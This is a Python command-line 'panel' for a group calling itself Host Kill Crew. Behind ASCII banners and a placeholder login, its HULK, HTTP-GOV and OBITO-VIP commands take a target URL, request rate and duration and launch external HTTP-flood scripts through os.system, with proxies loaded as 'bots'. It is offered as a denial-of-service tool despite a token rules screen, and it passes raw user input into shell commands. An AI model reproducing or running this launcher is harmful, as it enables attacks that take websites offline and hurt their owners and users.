
#█▀▄ █ █░░ ▄▀█ █▀█ ▄▀█ █▄░█ █▀▀   █▀ █░█ ▄▀█ █▀█ █▀▀
#█▄▀ █ █▄▄ █▀█ █▀▄ █▀█ █░▀█ █▄█   ▄█ █▀█ █▀█ █▀▄ ██▄

#▀█▀ █▀█ █▀█ █░░ █▀   █ █▄░█ █ █ █
#░█░ █▄█ █▄█ █▄▄ ▄█   █ █░▀█ █ ▄ ▄


import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def si():
    print('         \x1b[38;5;160m[ \x1b[38;2;233;233;233mHost Kill Crew \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to Host Kill Crew! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: LOGR\x1b[38;5;160m| \x1b[38;2;233;233;233mHost Kill Crew')
    print("")

def rules():
    clear()
    si()
    print(f'''

       \x1b[38;5;160m██╗░░██╗░█████╗░░██████╗████████╗  ██╗░░██╗██╗██╗░░░░░██╗░░░░░
       \x1b[38;5;160m██║░░██║██╔══██╗██╔════╝╚══██╔══╝  ██║░██╔╝██║██║░░░░░██║░░░░░
       \x1b[38;5;160m███████║██║░░██║╚█████╗░░░░██║░░░  █████═╝░██║██║░░░░░██║░░░░░
       \x1b[38;5;160m██╔══██║██║░░██║░╚═══██╗░░░██║░░░  ██╔═██╗░██║██║░░░░░██║░░░░░
       \x1b[38;5;160m██║░░██║╚█████╔╝██████╔╝░░░██║░░░  ██║░╚██╗██║███████╗███████╗
       \x1b[38;5;160m╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝╚══════╝╚══════╝

       \x1b[38;5;160m░█████╗░██████╗░███████╗░██╗░░░░░░░██╗
       \x1b[38;5;160m██╔══██╗██╔══██╗██╔════╝░██║░░██╗░░██║
       \x1b[38;5;160m██║░░╚═╝██████╔╝█████╗░░░╚██╗████╗██╔╝
       \x1b[38;5;160m██║░░██╗██╔══██╗██╔══╝░░░░████╔═████║░
       \x1b[38;5;160m╚█████╔╝██║░░██║███████╗░░╚██╔╝░╚██╔╝░
       \x1b[38;5;160m░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
''')

def menu():
    sys.stdout.write(f"         \x1b]2;Host Kill Crew | Online 1 | CON 1 | USERS Admin\x07")
    clear()
    print('\x1b[38;5;160m[ \x1b[38;2;233;233;233mHost Kill Crew \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to Host Kill Crew! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: LOGR \x1b[38;5;160m| \x1b[38;2;233;233;233mHost Kill Crew By LOGR')
    print("")
    print("""

       \x1b[38;5;160m██╗░░██╗░█████╗░░██████╗████████╗  ██╗░░██╗██╗██╗░░░░░██╗░░░░░
       \x1b[38;5;160m██║░░██║██╔══██╗██╔════╝╚══██╔══╝  ██║░██╔╝██║██║░░░░░██║░░░░░
       \x1b[38;5;160m███████║██║░░██║╚█████╗░░░░██║░░░  █████═╝░██║██║░░░░░██║░░░░░
       \x1b[38;5;160m██╔══██║██║░░██║░╚═══██╗░░░██║░░░  ██╔═██╗░██║██║░░░░░██║░░░░░
       \x1b[38;5;160m██║░░██║╚█████╔╝██████╔╝░░░██║░░░  ██║░╚██╗██║███████╗███████╗
       \x1b[38;5;160m╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝╚══════╝╚══════╝

       \x1b[38;5;160m░█████╗░██████╗░███████╗░██╗░░░░░░░██╗
       \x1b[38;5;160m██╔══██╗██╔══██╗██╔════╝░██║░░██╗░░██║
       \x1b[38;5;160m██║░░╚═╝██████╔╝█████╗░░░╚██╗████╗██╔╝
       \x1b[38;5;160m██║░░██╗██╔══██╗██╔══╝░░░░████╔═████║░
       \x1b[38;5;160m╚█████╔╝██║░░██║███████╗░░╚██╔╝░╚██╔╝░
       \x1b[38;5;160m░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░

            ╒══════════════════════════════════════════════════════╕   
              Tools Privat Hanya Untuk Admin Dan Owner
              Owner : LOGR33
            ╘══════════════════════════════════════════════════════╛

       █░█░█ █▀▀   ▄▀█ █▀█ █▀▀
       ▀▄▀▄▀ ██▄   █▀█ █▀▄ ██▄

        █░█ █▀█ █▀ ▀█▀ ▄▄ █▄▀ █ █░░ █░░ ▄▄ █▀▀ █▀█ █▀▀ █░█░█
        █▀█ █▄█ ▄█ ░█░ ░░ █░█ █ █▄▄ █▄▄ ░░ █▄▄ █▀▄ ██▄ ▀▄▀▄▀

       █░█░█ █▀▀   ▄▀█ █▀█ █▀▀   █░░ █▀▀ █▀▀ █ █▀█ █▄░█
       ▀▄▀▄▀ ██▄   █▀█ █▀▄ ██▄   █▄▄ ██▄ █▄█ █ █▄█ █░▀█

       
      
""")


def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;5;160m╔══[Host Kill Crew\x1b[\x1b[38;5;160m@a\x1b[38;5;160md\x1b[38;5;160mmin\x1b[38;5;160m]
\x1b[38;5;160m╚\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m➤ \x1b[38;5;160m''')
        if cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
            
#Method
                
        elif "HULK" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HULK <url> METHODS<GET/POST>')
                print('Example: HULK http://example.com GET')       
                
        elif "HTTP-GOV" in cnc:
            try:
                url = cnc.split()[1]
                req_per_ip = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-GOV.js -site {url} {req_per_ip} {time}')
            except IndexError:
                print('Usage: HTTP-GOV <url> <req_per_ip> <time>')
                print('Example: HTTP-GOV http://example.com 100 100')
                
        elif "OBITO-VIP" in cnc:
            try:
                url = cnc.split()[1]
                req_per_ip = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node Obito-vip.js -site {url} {req_per_ip} {time}')
            except IndexError:
                print('Usage: OBITO-VIP <url> <req_per_ip> <time>')
                print('Example: OBITO-VIP http://example.com 100 100')
                
        else:
            try:
                cmmnd = cnc.split()[0]
                print("\x1b[38;5;160mCommand: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
           
def login():
    clear()
    user = "*"
    passwd = "*"
    print("\x1b[38;5;160m     Welcome To Host Kill Crew")
    print("\x1b[38;5;160m        Please Login")
    time.sleep(1)
    clear()
    print("""

\x1b[38;5;160m██╗░░██╗░█████╗░░██████╗████████╗  ██╗░░██╗██╗██╗░░░░░██╗░░░░░
\x1b[38;5;160m██║░░██║██╔══██╗██╔════╝╚══██╔══╝  ██║░██╔╝██║██║░░░░░██║░░░░░
\x1b[38;5;160m███████║██║░░██║╚█████╗░░░░██║░░░  █████═╝░██║██║░░░░░██║░░░░░
\x1b[38;5;160m██╔══██║██║░░██║░╚═══██╗░░░██║░░░  ██╔═██╗░██║██║░░░░░██║░░░░░
\x1b[38;5;160m██║░░██║╚█████╔╝██████╔╝░░░██║░░░  ██║░╚██╗██║███████╗███████╗
\x1b[38;5;160m╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝╚══════╝╚══════╝

\x1b[38;5;160m░█████╗░██████╗░███████╗░██╗░░░░░░░██╗
\x1b[38;5;160m██╔══██╗██╔══██╗██╔════╝░██║░░██╗░░██║
\x1b[38;5;160m██║░░╚═╝██████╔╝█████╗░░░╚██╗████╗██╔╝
\x1b[38;5;160m██║░░██╗██╔══██╗██╔══╝░░░░████╔═████║░
\x1b[38;5;160m╚█████╔╝██║░░██║███████╗░░╚██╔╝░╚██╔╝░
\x1b[38;5;160m░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░

""")
    username = input("      </> Username: ")
    password = getpass.getpass(prompt='      </> Password: ')
    if username != user or password != passwd:
        print("")
        print("      </> Invalid?...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("      </> Welcome to Host Kill Crew!")
        time.sleep(0.3)
        main()

login()


